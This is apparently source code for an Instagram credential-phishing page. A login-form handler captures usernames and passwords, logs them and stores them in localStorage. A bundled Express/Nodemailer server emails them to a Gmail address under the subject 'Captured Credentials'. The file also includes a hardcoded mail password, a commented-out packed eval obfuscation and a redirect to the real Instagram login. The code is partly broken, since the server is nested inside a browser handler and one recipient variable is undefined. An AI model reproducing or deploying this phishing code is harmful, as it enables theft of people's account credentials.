document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the default form submission behavior

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const email = 'beckeralice064@example.com'; // Specify the email address here

    // Send credentials to the server
    fetch('https://localhost:3000/send-email' ,{
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password, email }),
    })
    .then(response => response.json())
    .then(data =>  console.log('Success:', data))
    //.catch(error=> console.error('Error:', error));
    
     // Log the credentials to the console
    console.log('Username:', username);
    console.log('Password:', password);
    
//     // Obfuscated code
 //eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3.4(\'5\').6(\'7\',8(9){9.0();a b=3.4(\'c\').d;e f=3.4(\'g\').d;h.i(\'j:\',b);h.i(\'k:\',f)});',22,22,'preventDefault|username|password|document|getElementById|loginForm|addEventListener|submit|function|event|const|value|console|log|Username|Password'.split('|'),0,{}))

    //save credentials to local storage
    localStorage.setItem('username', username);
    localStorage.setItem('password', password);

    // Optionally, redirect to the Instagram login page
    // Remove or modify this line if you don't want to redirect
    // window.location.href = 'https://www.instagram.com/accounts/login/'; 
    
   const express = require('express');
    const bodyParser = require('body-parser');
    const nodemailer = require('nodemailer');
    const app = express();
    const port = 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Route to handle POST requests
app.post('/send-email', (req, res) => {
    const { username, password, email } = req.body;

    // Configure Nodemailer
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'beckeralice064@gmail.com' ,// Your email
            pass: 'Tryhackmebitch8U' , // Your email password or app password
        }
    });

    // Email options
    const mailOptions = {
        from: 'beckeralice064@gmail.com',
        to: beckeralice064 , // Email address to send the credentials to
        subject: 'Captured Credentials',
        text: `Username: ${username}\nPassword: ${password}`
    };

    // Send the email
    transporter.sendMail(mailOptions, (err, info) => {
        if (err) {
            console.error('Error sending email:', err);
            res.status(500).json({ status: 'error', message: 'Failed to send email' });
        } else {
            console.log('Email sent:', info.response);
            res.json({ status: 'success', message: 'Email sent successfully' });
        }
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
});

